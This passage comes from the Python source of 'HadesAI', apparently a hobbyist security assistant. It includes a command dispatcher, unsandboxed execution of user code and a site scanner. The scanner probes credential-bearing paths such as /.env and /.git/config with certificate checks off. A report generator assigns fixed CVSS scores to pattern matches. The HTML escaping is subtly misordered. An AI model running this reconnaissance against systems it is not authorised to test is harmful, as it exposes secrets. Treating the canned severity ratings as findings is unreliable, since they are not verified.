            new_code = re.sub(r"def (\w+)\((.*?)\):", r"def \1(\2):\n    print(f'Entering \1')", self.current_code)
            return new_code
        elif "add error handling" in instruction_lower or "add try" in instruction_lower:
            lines = self.current_code.splitlines()
            indented = "\n".join("    " + line for line in lines)
            return f"try:\n{indented}\nexcept Exception as e:\n    print(f'Error: {{e}}')"
        elif "convert to async" in instruction_lower:
            return self.current_code.replace("def ", "async def ").replace("return ", "return await ")
        elif "add type hints" in instruction_lower:
            return self.current_code.replace("def ", "def ").replace("(self)", "(self) -> None")
        else:
            return f"# Instruction not recognized locally. Install openai for GPT support.\n{self.current_code}"
    
    def apply_instruction(self, instruction: str, api_key: str = None) -> str:
        """Apply instruction - uses GPT if available, falls back to local"""
        if not self.current_code:
            return "⚠️ No code loaded. Use set_code() first."
        
        key = api_key or os.getenv("OPENAI_API_KEY", "")
        if HAS_OPENAI and key:
            return self.gpt_modify(self.current_code, instruction, api_key=key)
        else:
            return self.apply_instruction_local(instruction)
    
    def execute_code(self, code_str: str) -> str:
        """Execute Python code and return output"""
        try:
            self.last_code = code_str
            old_stdout = sys.stdout
            sys.stdout = mystdout = StringIO()
            exec(code_str, {"__builtins__": __builtins__}, {})
            output = mystdout.getvalue()
            sys.stdout = old_stdout
            return f"✅ Code executed.\nOutput:\n{output.strip()}"
        except Exception as e:
            sys.stdout = sys.__stdout__
            return f"❌ Execution Error:\n{traceback.format_exc()}"


# ============================================================================
# MAIN AI CLASS  
# ============================================================================

class HadesAI:
    def __init__(self, knowledge_path: str = "hades_knowledge.db"):
        self.kb = KnowledgeBase(knowledge_path)
        self.proxy_manager = ProxyManager()
        self.web_learner = WebLearner(self.kb)
        self.chat_processor = ChatProcessor(self.kb)
        self.exploitation = ExploitationEngine(self.proxy_manager)
        self.request_injector = RequestInjector(self.proxy_manager)
        self.auth_bypass = AuthBypass(self.proxy_manager)
        self.current_state = {}
        self.mode = 'chat'  # Modes: chat, code, explain
        self.personality = "Doomcore Hyperlogic"
        self.modules = {}
        self.last_code = ""
        self.files = {} # filename -> code str
        self.code_assistant = CodeEditorAssistant()
        
        # Initialize cognitive memory system
        if HAS_COGNITIVE_MEMORY:
            self.cognitive = CognitiveLayer()
            logger.info("Cognitive memory layer initialized")
            # Start background memory optimizer
            self._start_background_optimizer()
        else:
            self.cognitive = None
            logger.warning("Cognitive memory system not available")
        
        self._optimizer_thread = None
    def chat(self, message: str) -> Dict:
        return self.chat_processor.process(message)
        
    def learn_from_url(self, url: str) -> Dict:
        return self.web_learner.learn_from_url(url)
        
    def get_stats(self) -> Dict:
        cursor = self.kb.conn.cursor()
        stats = {}
        for table in ['experiences', 'security_patterns', 'learned_exploits', 'threat_findings', 'cache_entries']:
            cursor.execute(f'SELECT COUNT(*) FROM {table}')
            stats[table] = cursor.fetchone()[0]
        if self.cognitive:
            stats['cognitive_memories'] = self.cognitive.get_memory_stats()
        return stats
    
    # ========== Cognitive Memory Methods ==========
    def remember(self, text: str, importance: float = 0.5, metadata: dict = None) -> Optional[str]:
        """Store content in cognitive memory."""
        if not self.cognitive:
            return None
        return self.cognitive.remember(text, importance, metadata)
    
    def recall(self, query: str, top_k: int = 5) -> List[tuple]:
        """Retrieve relevant memories by semantic similarity."""
        if not self.cognitive:
            return []
        return self.cognitive.recall(query, top_k)
    
    def optimize_memory(self, prune_threshold: float = 0.2, apply_decay: bool = True) -> Dict:
        """Optimize cognitive memory storage."""
        if not self.cognitive:
            return {'error': 'Cognitive memory not available'}
        return self.cognitive.optimize(prune_threshold, apply_decay)
    
    def forget(self, memory_id: str) -> bool:
        """Remove a specific memory."""
        if not self.cognitive:
            return False
        return self.cognitive.forget(memory_id)
    
    def get_memory_stats(self) -> Dict:
        """Get cognitive memory statistics."""
        if not self.cognitive:
            return {'error': 'Cognitive memory not available'}
        return self.cognitive.get_memory_stats()
    
    # ========== Feedback Loop Methods ==========
    def evaluate_response(self, user_input: str, ai_output: str, 
                         success_score: float, metadata: dict = None) -> Optional[str]:
        """
        Evaluate an AI response and update memory based on outcome.
        
        Args:
            user_input: User's original query
            ai_output: AI's response
            success_score: Success evaluation (0.0-1.0)
            metadata: Optional metadata about interaction
            
        Returns:
            Reflection ID or None if cognitive memory unavailable
        """
        if not self.cognitive:
            return None
        return self.cognitive.evaluate_response(user_input, ai_output, success_score, metadata)
    
    def reinforce_memory(self, memory_id: str, success_score: float) -> bool:
        """Reinforce a specific memory based on feedback."""
        if not self.cognitive:
            return False
        return self.cognitive.reinforce_memory(memory_id, success_score)
    
    def generate_with_memory(self, query: str, llm_call: Callable) -> tuple:
        """
        Generate a response using cognitive memory for context.
        Memory-augmented generation improves response quality and speed.
        
        Args:
            query: User query
            llm_call: LLM function that accepts (query, memory_context)
            
        Returns:
            Tuple of (response, recalled_memories)
        """
        if not self.cognitive:
            return llm_call(query, ""), []
        
        def context_provider(q, mem_context):
            prompt = f"""Relevant prior knowledge:
{mem_context}

Current query:
{q}"""
            return llm_call(prompt)
        
        return self.cognitive.generate_with_memory(query, context_provider)
    
    def get_full_cognitive_stats(self) -> Dict:
        """Get comprehensive statistics about memories and reflections."""
        if not self.cognitive:
            return {'error': 'Cognitive memory not available'}
        return self.cognitive.get_full_stats()
    
    # ========== Background Optimizer ==========
    def _start_background_optimizer(self, interval_seconds: int = 3600):
        """
        Start background memory optimizer thread.
        Runs periodically to prune and compress memories.
        
        Args:
            interval_seconds: Optimization interval (default: 1 hour)
        """
        if not self.cognitive:
            return
        
        def background_optimizer():
            while True:
                try:
                    time.sleep(interval_seconds)
                    if self.cognitive:
                        stats = self.cognitive.optimize(
                            prune_threshold=0.25,
                            apply_decay=True
                        )
                        logger.info(f"Background optimization: pruned {stats['pruned_count']} memories")
                except Exception as e:
                    logger.error(f"Background optimizer error: {e}")
        
        self._optimizer_thread = threading.Thread(
            target=background_optimizer,
            daemon=True,
            name="HadesAI-MemoryOptimizer"
        )
        self._optimizer_thread.start()
        logger.info("Background memory optimizer started")
    def dispatch(self, user_input):
        """Dispatch commands - supports file operations, GPT analysis, and mode switching"""
        user_input = user_input.strip()

        # Mode switching
        if user_input.startswith("::mode"):
            _, new_mode = user_input.split(" ", 1)
            self.mode = new_mode.strip()
            return f"🔁 Mode switched to: {self.mode}"

        # File operations
        if user_input.startswith("::load"):
            filename = user_input.split("::load", 1)[1].strip()
            return self.code_assistant.load_file(filename)

        if user_input.startswith("::save"):
            filename = user_input.split("::save", 1)[1].strip()
            return self.code_assistant.save_file(filename)

        if user_input.startswith("::analyze"):
            filename = user_input.split("::analyze", 1)[1].strip()
            return self.code_assistant.analyze_file(filename)

        if user_input.startswith("::edit"):
            parts = user_input.split(" ", 2)
            if len(parts) == 3:
                filename = parts[1]
                instruction = parts[2]
                if filename in self.code_assistant.files:
                    self.code_assistant.set_code(self.code_assistant.files[filename])
                    result = self.code_assistant.apply_instruction(instruction)
                    self.code_assistant.files[filename] = result
                    return f"[🛠️] Applied instruction to {filename}:\n{result[:500]}..."
                return "[⚠️] File not loaded. Use ::load filename first."
            return "[⚠️] Usage: ::edit filename instruction"

        # GPT code analysis
        if user_input.startswith("::gpt"):
            filename = user_input.split("::gpt", 1)[1].strip()
            return self.code_assistant.analyze_file_with_gpt(filename)

        if user_input.startswith("::gptfunc"):
            filename = user_input.split("::gptfunc", 1)[1].strip()
            return self.code_assistant.analyze_file_with_gpt(filename)

        if user_input.startswith("::explain"):
            code = user_input.split("::explain", 1)[1].strip()
            if not code and self.code_assistant.current_code:
                code = self.code_assistant.current_code
            return self.code_assistant.explain_code(code)

        if user_input.startswith("::exec"):
            code = user_input.split("::exec", 1)[1].strip()
            return self.code_assistant.execute_code(code)

        # Help command
        if user_input.lower() in ["::help", "help", "?"]:
            return """🔥 **HADES AI - Code & Chat Commands:**

**Mode Switching:**
• `::mode chat` - Chat mode (default)
• `::mode code` - Code execution mode
• `::mode explain` - Code explanation mode
• `::mode assist` - Code assistant mode

**File Operations:**
• `::load filename` - Load a file for editing
• `::save filename` - Save changes to file
• `::analyze filename` - Analyze file structure
• `::edit filename instruction` - Apply instruction to file

**GPT Analysis:**
• `::gpt filename` - GPT analysis of file functions
• `::gptfunc filename` - Same as ::gpt
• `::explain code` - Explain code structure
• `::exec code` - Execute Python code

**Pentesting:** (in chat mode)
• `scan https://target.com` - Full reconnaissance
• `scan ports on IP` - Port scan
• `vuln scan URL` - Vulnerability scan
• `learn from URL` - Learn exploits from URL
• `show stats` - View statistics
"""

        # Mode-based dispatch
        if self.mode == 'code':
            return self.handle_code_interpreter(user_input)
        elif self.mode == 'explain':
            return self.explain_code(user_input)
        elif self.mode == 'assist':
            return self.code_assistant_mode(user_input)
        else:
            return self.handle_chat(user_input)
    def handle_chat(self, user_input):
        return f"[HadesAI] ✒️ Echoing in {self.personality}: {user_input}"


    def handle_code_interpreter(self, code_str):
        try:
            self.last_code = code_str # Save code for assist mode
            old_stdout = sys.stdout
            sys.stdout = mystdout = StringIO()
            exec(code_str, {}, {})
            output = mystdout.getvalue()
            sys.stdout = old_stdout
            return f"✅ Code executed.\nOutput:\n{output.strip()}"
        except Exception as e:
            sys.stdout = old_stdout
            return f"❌ Execution Error:\n{traceback.format_exc()}"
    def explain_code(self, code_str):
        try:
            tree = ast.parse(code_str)
            explanations = []
            for node in tree.body:
                if isinstance(node, ast.FunctionDef):
                    args = [arg.arg for arg in node.args.args]
                    explanations.append(
                        f"📘 Function `{node.name}` takes args: {args}"
                    )
                elif isinstance(node, ast.Import):
                    modules = [alias.name for alias in node.names]
                    explanations.append(f"📦 Imports modules: {modules}")
                elif isinstance(node, ast.ImportFrom):
                    modules = [alias.name for alias in node.names]
                    explanations.append(f"📦 From {node.module} import {modules}")
                elif isinstance(node, ast.Assign):
                    targets = [ast.unparse(t) for t in node.targets]
                    explanations.append(f"🔧 Variable(s) assigned: {targets}")
            return "\n".join(explanations) if explanations else "ℹ️ No recognizable constructs to explain."
        except Exception as e:
            return f"❌ Explanation Error:\n{traceback.format_exc()}"

    def code_assistant_mode(self, instruction):
        """Handle assist mode - uses GPT if available for intelligent code modifications"""
        if not self.last_code:
            return "⚠️ No code loaded. Switch to ::mode code and provide code first."
        try:
            self.code_assistant.set_code(self.last_code)
            result = self.code_assistant.apply_instruction(instruction)
            return f"🛠️ Modified Code:\n{result}"
        except Exception as e:
            return f"❌ Assistant Error:\n{traceback.format_exc()}"
    
    def gpt_chat(self, message: str, api_key: str = None) -> str:
        """Direct GPT chat for code-related questions"""
        if not HAS_OPENAI:
            return "GPT not available. Install with: pip install openai"
        
        key = api_key or os.getenv("OPENAI_API_KEY", "")
        if not key:
            return "GPT not available. Enter your API key in the Self-Improvement tab."
        
        try:
            client = OpenAI(api_key=key)
            response = client.chat.completions.create(
                model="gpt-3.5-turbo",
                messages=[
                    {"role": "system", "content": "You are HADES, an expert security and coding assistant. Help with pentesting, code analysis, and security questions."},
                    {"role": "user", "content": message}
                ],
                max_tokens=2000,
                temperature=0.7
            )
            return response.choices[0].message.content
        except Exception as e:
            return f"GPT Error: {e}"
    def full_site_scan(self, url: str, callback=None) -> Dict[str, Any]:
        """
        Comprehensive automated reconnaissance on a target URL.
        Runs multiple scan types and learns from findings.
        """
        import urllib.parse
        from datetime import datetime
        
        results = {
            'target': url,
            'started_at': datetime.now().isoformat(),
            'scans_completed': [],
            'findings': [],
            'exploits_learned': 0,
            'vulnerabilities': [],
            'status': 'running'
        }
        
        def log(msg):
            if callback:
                callback(msg)
            results['scans_completed'].append(msg)
        
        try:
            parsed = urllib.parse.urlparse(url)
            domain = parsed.netloc or parsed.path.split('/')[0]
            base_url = f"{parsed.scheme}://{domain}" if parsed.scheme else f"https://{domain}"
            
            log(f"🎯 Starting full reconnaissance on {domain}")
            
            # 1. Learn from the URL itself
            log("📚 Phase 1: Learning from target URL...")
            learn_result = self.learn_from_url(url)
            if learn_result.get('exploits_learned', 0) > 0:
                results['exploits_learned'] += learn_result['exploits_learned']
                log(f"   ✓ Learned {learn_result['exploits_learned']} exploit patterns")
            else:
                log("   ✓ URL analyzed (no exploits found)")
            
            # 2. Check for common vulnerability paths
            log("🔍 Phase 2: Checking common vulnerability paths...")
            vuln_paths = [
                '/robots.txt', '/.git/config', '/.env', '/wp-config.php.bak',
                '/admin', '/login', '/api', '/graphql', '/.well-known/security.txt',
                '/swagger.json', '/api-docs', '/debug', '/trace', '/server-status'
            ]
            
            if HAS_REQUESTS:
                session = self.proxy_manager.get_session()
                for path in vuln_paths[:10]:
                    try:
                        test_url = f"{base_url}{path}"
                        r = session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                        if r.status_code == 200:
                            finding = {
                                'type': 'exposed_path',
                                'path': path,
                                'url': test_url,
                                'status': r.status_code,
                                'severity': 'MEDIUM' if path in ['/.git/config', '/.env'] else 'LOW'
                            }
                            results['vulnerabilities'].append(finding)
                            log(f"   ⚠️ Found: {path} (Status: {r.status_code})")
                            
                            # Store as threat finding
                            self.kb.store_threat_finding(ThreatFinding(
                                path=test_url,
                                threat_type='exposed_path',
                                pattern=path,
                                severity=finding['severity'],
                                code_snippet=r.text[:200] if r.text else '',
                                browser='HADES_SCAN',
                                context=f"Exposed path found during automated scan"
                            ))
                    except:
                        pass
            
            # 3. Header analysis
            log("🔒 Phase 3: Analyzing security headers...")
            if HAS_REQUESTS:
                try:
                    session = self.proxy_manager.get_session()
                    r = session.get(base_url, timeout=10, verify=False)
                    headers = r.headers
                    
                    security_headers = {
                        'X-Frame-Options': 'Clickjacking protection',
                        'X-Content-Type-Options': 'MIME sniffing protection',
                        'X-XSS-Protection': 'XSS filter',
                        'Content-Security-Policy': 'CSP protection',
                        'Strict-Transport-Security': 'HTTPS enforcement',
                        'X-Permitted-Cross-Domain-Policies': 'Flash/PDF policy'
                    }
                    
                    missing_headers = []
                    for header, desc in security_headers.items():
                        if header not in headers:
                            missing_headers.append(header)
                            results['vulnerabilities'].append({
                                'type': 'missing_header',
                                'header': header,
                                'description': desc,
                                'severity': 'LOW'
                            })
                    
                    if missing_headers:
                        log(f"   ⚠️ Missing security headers: {', '.join(missing_headers[:3])}...")
                    else:
                        log("   ✓ Security headers look good")
                        
                except Exception as e:
                    log(f"   ✗ Header analysis failed: {str(e)[:50]}")
            
            # 4. Try to learn from related security resources
            log("📖 Phase 4: Learning from security databases...")
            security_urls = [
                f"https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword={domain}",
            ]
            
            for sec_url in security_urls[:1]:
                try:
                    learn_result = self.learn_from_url(sec_url)
                    if learn_result.get('exploits_learned', 0) > 0:
                        results['exploits_learned'] += learn_result['exploits_learned']
                        log(f"   ✓ Learned {learn_result['exploits_learned']} from security database")
                except:
                    pass
            
            # 5. Form detection and analysis
            log("📝 Phase 5: Detecting forms and input fields...")
            if HAS_REQUESTS:
                try:
                    session = self.proxy_manager.get_session()
                    r = session.get(url, timeout=10, verify=False)
                    
                    # Simple form detection
                    form_count = r.text.lower().count('<form')
                    input_count = r.text.lower().count('<input')
                    
                    if form_count > 0:
                        log(f"   ✓ Found {form_count} forms with {input_count} input fields")
                        results['vulnerabilities'].append({
                            'type': 'form_detected',
                            'forms': form_count,
                            'inputs': input_count,
                            'severity': 'INFO',
                            'note': 'Forms detected - potential XSS/SQLi targets'
                        })
                except:
                    pass
            
            results['completed_at'] = datetime.now().isoformat()
            results['status'] = 'completed'
            results['total_vulnerabilities'] = len(results['vulnerabilities'])
            
            log(f"✅ Scan complete! Found {len(results['vulnerabilities'])} potential issues")
            
        except Exception as e:
            results['status'] = 'error'
            results['error'] = str(e)
            log(f"❌ Scan error: {str(e)}")
        
        return results
    
    def export_exploits_to_pdf(self, filepath: str, clear_after: bool = False) -> Dict[str, Any]:
        if not HAS_REPORTLAB:
            return {'success': False, 'error': 'reportlab not installed. Run: pip install reportlab'}
        
        try:
            exploits = self.kb.get_all_learned_exploits()
            findings = self.kb.get_threat_findings(500)
            patterns = self.kb.get_patterns()
            stats = self.get_stats()
            
            doc = SimpleDocTemplate(filepath, pagesize=A4, 
                                   rightMargin=0.5*inch, leftMargin=0.5*inch,
                                   topMargin=0.5*inch, bottomMargin=0.5*inch)
            
            styles = getSampleStyleSheet()
            title_style = ParagraphStyle('Title', parent=styles['Heading1'], 
                                        fontSize=24, textColor=colors.HexColor('#e94560'),
                                        alignment=TA_CENTER, spaceAfter=30)
            heading_style = ParagraphStyle('Heading', parent=styles['Heading2'],
                                          fontSize=16, textColor=colors.HexColor('#0f3460'),
                                          spaceBefore=20, spaceAfter=10)
            subheading_style = ParagraphStyle('SubHeading', parent=styles['Heading3'],
                                             fontSize=12, textColor=colors.HexColor('#e94560'),
                                             spaceBefore=15, spaceAfter=5)
            code_style = ParagraphStyle('Code', parent=styles['Code'],
                                       fontSize=8, fontName='Courier',
                                       backColor=colors.HexColor('#f5f5f5'),
                                       leftIndent=10, rightIndent=10,
                                       spaceBefore=5, spaceAfter=10)
            normal_style = styles['Normal']
            label_style = ParagraphStyle('Label', parent=normal_style, 
                                        fontSize=9, textColor=colors.HexColor('#0f3460'),
                                        fontName='Helvetica-Bold', spaceBefore=8)
            impact_style = ParagraphStyle('Impact', parent=normal_style,
                                         fontSize=9, leftIndent=15, 
                                         textColor=colors.HexColor('#333333'))
            
            elements = []
            
            # ========== RESPONSIBLE DISCLOSURE HEADER ==========
            elements.append(Paragraph("SECURITY VULNERABILITY REPORT", title_style))
            elements.append(Spacer(1, 10))
            
            disclosure_text = """
            <b>RESPONSIBLE DISCLOSURE NOTICE</b><br/><br/>
            This report discloses security vulnerabilities identified through automated analysis 
            and manual review. This submission is made under responsible disclosure guidelines. 
            The findings contained herein are provided for authorized security testing and 
            remediation purposes only.<br/><br/>
            <b>Report ID:</b> HADES-{report_id}<br/>
            <b>Generated:</b> {timestamp}<br/>
            <b>Classification:</b> Security Assessment Report
            """.format(
                report_id=hashlib.sha256(datetime.now().isoformat().encode()).hexdigest()[:12].upper(),
                timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')
            )
            elements.append(Paragraph(disclosure_text, normal_style))
            elements.append(Spacer(1, 20))
            
            # ========== EXECUTIVE SUMMARY ==========
            elements.append(Paragraph("1. Executive Summary", heading_style))
            
            severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
            for f in findings:
                sev = f.get('severity', 'LOW')
                if sev in severity_counts:
                    severity_counts[sev] += 1
                    
            summary_text = f"""
            This automated security assessment identified <b>{len(findings)} potential vulnerabilities</b> 
            and learned <b>{len(exploits)} exploit patterns</b> from various sources.<br/><br/>
            <b>Severity Breakdown:</b><br/>
            • Critical: {severity_counts['CRITICAL']}<br/>
            • High: {severity_counts['HIGH']}<br/>
            • Medium: {severity_counts['MEDIUM']}<br/>
            • Low: {severity_counts['LOW']}
            """
            elements.append(Paragraph(summary_text, normal_style))
            
            stats_data = [
                ['Metric', 'Count', 'Risk Level'],
                ['Exploits Learned', str(len(exploits)), 'Info'],
                ['Threat Findings', str(len(findings)), 'High' if len(findings) > 10 else 'Medium'],
                ['Security Patterns', str(stats.get('security_patterns', 0)), 'Info'],
                ['Cache Entries Analyzed', str(stats.get('cache_entries', 0)), 'Info'],
            ]
            stats_table = Table(stats_data, colWidths=[2.5*inch, 1.5*inch, 1.5*inch])
            stats_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#0f3460')),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, 0), 11),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.HexColor('#f5f5f5')),
                ('GRID', (0, 0), (-1, -1), 1, colors.HexColor('#cccccc')),
            ]))
            elements.append(Spacer(1, 15))
            elements.append(stats_table)
            elements.append(PageBreak())
            
            # ========== DETAILED VULNERABILITY FINDINGS ==========
            if findings:
                elements.append(Paragraph("2. Detailed Vulnerability Findings", heading_style))
                elements.append(Paragraph(
                    "Each finding below includes reproduction steps, impact analysis, and evidence.",
                    normal_style
                ))
                elements.append(Spacer(1, 15))
                
                # Impact descriptions for each vulnerability type
                impact_map = {
                    'eval_code': {
                        'impact': 'Remote Code Execution (RCE) - An attacker could execute arbitrary code on the client or server.',
                        'cvss': '9.8 (Critical)',
                        'cwe': 'CWE-94: Improper Control of Generation of Code',
                        'confidentiality': 'HIGH - Complete system compromise possible',
                        'integrity': 'HIGH - Arbitrary code execution allows data modification',
                        'availability': 'HIGH - System can be crashed or made unavailable'
                    },
                    'injection': {
                        'impact': 'Cross-Site Scripting (XSS) - Attacker can inject malicious scripts that execute in victim browsers.',
                        'cvss': '6.1-7.5 (Medium-High)',
                        'cwe': 'CWE-79: Cross-site Scripting',
                        'confidentiality': 'MEDIUM - Session tokens and cookies can be stolen',
                        'integrity': 'MEDIUM - Page content can be modified',
                        'availability': 'LOW - Limited DoS through script loops'
                    },
                    'data_exfil': {
                        'impact': 'Data Exfiltration - Sensitive data including cookies and storage can be accessed/stolen.',
                        'cvss': '7.5 (High)',
                        'cwe': 'CWE-200: Exposure of Sensitive Information',
                        'confidentiality': 'HIGH - User data and credentials at risk',
                        'integrity': 'LOW - Data read but not modified',
                        'availability': 'NONE'
                    },
                    'obfuscation': {
                        'impact': 'Code Obfuscation - Potentially malicious code hidden using encoding techniques.',
                        'cvss': '5.0-7.0 (Medium)',
                        'cwe': 'CWE-506: Embedded Malicious Code',
                        'confidentiality': 'MEDIUM - Hidden functionality may steal data',
                        'integrity': 'MEDIUM - Obfuscated code may modify behavior',
                        'availability': 'LOW'
                    },
                    'malware': {
                        'impact': 'Malware Indicator - File contains patterns consistent with known malware.',
                        'cvss': '9.0+ (Critical)',
                        'cwe': 'CWE-506: Embedded Malicious Code',
                        'confidentiality': 'HIGH - Complete compromise',
                        'integrity': 'HIGH - System modifications',
                        'availability': 'HIGH - Ransomware/DoS possible'
                    },
                    'exploit': {
                        'impact': 'Exploit Code - Active exploitation attempt or exploit payload detected.',
                        'cvss': '8.0-10.0 (High-Critical)',
                        'cwe': 'CWE-20: Improper Input Validation',
                        'confidentiality': 'HIGH',
                        'integrity': 'HIGH',
                        'availability': 'HIGH'
                    },
                    'backdoor': {
                        'impact': 'Backdoor/C2 - Command and control or persistent access mechanism detected.',
                        'cvss': '9.8 (Critical)',
                        'cwe': 'CWE-506: Embedded Malicious Code',
                        'confidentiality': 'HIGH - Remote access to system',
                        'integrity': 'HIGH - Full control',
                        'availability': 'HIGH'
                    },
                    'crypto': {
                        'impact': 'Cryptominer/Crypto - Cryptocurrency-related code that may indicate cryptojacking.',
                        'cvss': '5.0-6.0 (Medium)',
                        'cwe': 'CWE-400: Uncontrolled Resource Consumption',
                        'confidentiality': 'LOW',
                        'integrity': 'LOW',
                        'availability': 'MEDIUM - Resource consumption'
                    }
                }
                
                for idx, f in enumerate(findings[:30], 1):
                    threat_type = f.get('threat_type', 'unknown')
                    impact_info = impact_map.get(threat_type, {
                        'impact': 'Potential security issue detected.',
                        'cvss': 'TBD',
                        'cwe': 'TBD',
                        'confidentiality': 'TBD',
                        'integrity': 'TBD',
                        'availability': 'TBD'
                    })
                    
                    # Extract domain/context from path
                    path_parts = f['path'].replace('\\', '/').split('/')
                    domain_context = 'Unknown'
                    for part in path_parts:
                        if '.' in part and len(part) > 4:
                            domain_context = part
                            break
                    
                    # Finding header with verification status
                    sev_color = {'HIGH': '#e94560', 'MEDIUM': '#ffa500', 'LOW': '#4CAF50'}.get(f['severity'], '#666')
                    elements.append(Paragraph(
                        f"<b>Finding #{idx}: {threat_type.upper().replace('_', ' ')}</b> "
                        f"<font color='{sev_color}'>[{f['severity']}]</font>",
                        subheading_style
                    ))
                    
                    # ========== VERIFICATION STATUS ==========
                    elements.append(Paragraph("<b>Verification Status:</b>", label_style))
                    verification_table = Table([
                        ['Status', 'Automated Detection - Manual Verification Recommended'],
                        ['Confidence', f"{f['severity']} confidence based on pattern matching"],
                        ['Validated', 'Pending manual confirmation'],
                    ], colWidths=[1.2*inch, 4.5*inch])
                    verification_table.setStyle(TableStyle([
                        ('FONTSIZE', (0, 0), (-1, -1), 8),
                        ('BACKGROUND', (0, 0), (0, -1), colors.HexColor('#f0f0f0')),
                        ('FONTNAME', (0, 0), (0, -1), 'Helvetica-Bold'),
                        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#cccccc')),
                        ('VALIGN', (0, 0), (-1, -1), 'TOP'),
                    ]))
                    elements.append(verification_table)
                    elements.append(Spacer(1, 5))
                    
                    # ========== EXPLOIT CONTEXT ==========
                    elements.append(Paragraph("<b>Exploit Context:</b>", label_style))
                    context_text = f"""
                    <b>Target Domain/Application:</b> {domain_context}<br/>
                    <b>Affected Component:</b> Browser cache / Cached web content<br/>
                    <b>Input Vector:</b> {f.get('pattern', 'Pattern-based detection')[:50]}<br/>
                    <b>Attack Surface:</b> Client-side cached JavaScript/HTML<br/>
                    <b>Discovery Method:</b> Automated cache analysis by HADES AI
                    """
                    elements.append(Paragraph(context_text, impact_style))
                    
                    # ========== AFFECTED ASSET ==========
                    elements.append(Paragraph("<b>Affected Asset:</b>", label_style))
                    elements.append(Paragraph(f"<b>Full Path:</b> {f['path']}", impact_style))
                    elements.append(Paragraph(f"<b>Browser:</b> {f['browser']}", impact_style))
                    elements.append(Paragraph(f"<b>Detected:</b> {f.get('detected_at', 'N/A')[:19]}", impact_style))
                    
                    # ========== SECURITY CONTEXT (CWE/CVSS) ==========
                    elements.append(Paragraph("<b>Security Context:</b>", label_style))
                    security_table = Table([
                        ['CVSS Score', 'CWE ID', 'OWASP Category'],
                        [impact_info['cvss'], impact_info['cwe'], self._get_owasp_category(threat_type)],
                    ], colWidths=[2*inch, 2.5*inch, 2*inch])
                    security_table.setStyle(TableStyle([
                        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#0f3460')),
                        ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
                        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                        ('FONTSIZE', (0, 0), (-1, -1), 8),
                        ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#cccccc')),
                        ('BACKGROUND', (0, 1), (-1, -1), colors.HexColor('#f5f5f5')),
                    ]))
                    elements.append(security_table)
                    elements.append(Spacer(1, 5))
                    
                    # ========== IMPACT DESCRIPTION ==========
                    elements.append(Paragraph("<b>Impact Description:</b>", label_style))
                    elements.append(Paragraph(f"<b>Summary:</b> {impact_info['impact']}", impact_style))
                    impact_detail = f"""
                    <b>Potential Damage:</b><br/>
                    • <b>Data Theft:</b> {self._get_data_theft_risk(threat_type)}<br/>
                    • <b>Session Hijack:</b> {self._get_session_risk(threat_type)}<br/>
                    • <b>Remote Code Execution:</b> {self._get_rce_risk(threat_type)}<br/>
                    • <b>Lateral Movement:</b> {self._get_lateral_risk(threat_type)}
                    """
                    elements.append(Paragraph(impact_detail, impact_style))
                    
                    # CIA Impact
                    elements.append(Paragraph("<b>CIA Triad Impact:</b>", label_style))
                    elements.append(Paragraph(f"• <b>Confidentiality:</b> {impact_info['confidentiality']}", impact_style))
                    elements.append(Paragraph(f"• <b>Integrity:</b> {impact_info['integrity']}", impact_style))
                    elements.append(Paragraph(f"• <b>Availability:</b> {impact_info['availability']}", impact_style))
                    
                    # ========== EVIDENCE / CODE SNIPPET ==========
                    elements.append(Paragraph("<b>Evidence (Code Snippet):</b>", label_style))
                    elements.append(Paragraph(
                        "<i>The following code was extracted from the cached file:</i>",
                        ParagraphStyle('Italic', parent=impact_style, fontSize=8, textColor=colors.gray)
                    ))
                    code_snippet = f.get('code_snippet', 'N/A')[:400]
                    code_snippet = code_snippet.replace('<', '&lt;').replace('>', '&gt;').replace('&', '&amp;')
                    elements.append(Paragraph(f"<font face='Courier' size='7'>{code_snippet}</font>", code_style))
                    
                    # Screenshot placeholder
                    elements.append(Paragraph("<b>Screenshot Evidence:</b>", label_style))
                    elements.append(Paragraph(
                        f"[ATTACH SCREENSHOT: evidence_finding_{idx}.png]<br/>"
                        "<i>Capture browser DevTools showing the malicious code execution or network request.</i>",
                        ParagraphStyle('Placeholder', parent=impact_style, fontSize=8, 
                                      textColor=colors.HexColor('#888888'), backColor=colors.HexColor('#f9f9f9'))
                    ))
                    
                    # ========== DETAILED REPRODUCTION STEPS ==========
                    elements.append(Paragraph("<b>Reproduction Steps:</b>", label_style))
                    repro_steps = f"""
                    <b>Prerequisites:</b><br/>
                    • Browser with cache enabled (same browser as affected: {f['browser']})<br/>
                    • Network proxy tool (Burp Suite/OWASP ZAP) for traffic analysis<br/>
                    • Text editor or hex viewer for cache file inspection<br/><br/>
                    
                    <b>Step-by-Step Reproduction:</b><br/>
                    <b>1.</b> Open browser Developer Tools (F12) → Network tab<br/>
                    <b>2.</b> Navigate to the affected domain: <font face='Courier'>{domain_context}</font><br/>
                    <b>3.</b> Locate the cached resource in browser cache directory:<br/>
                    &nbsp;&nbsp;&nbsp;&nbsp;<font face='Courier' size='7'>{f['path'][-80:]}</font><br/>
                    <b>4.</b> Search for the malicious pattern:<br/>
                    &nbsp;&nbsp;&nbsp;&nbsp;<font face='Courier' size='7'>{f.get('pattern', 'N/A')[:60]}</font><br/>
                    <b>5.</b> Observe the vulnerable code at the location indicated<br/>
                    <b>6.</b> To trigger: Clear cache, revisit the page, monitor for code execution in Console tab<br/><br/>
                    
                    <b>cURL Command (if applicable):</b><br/>
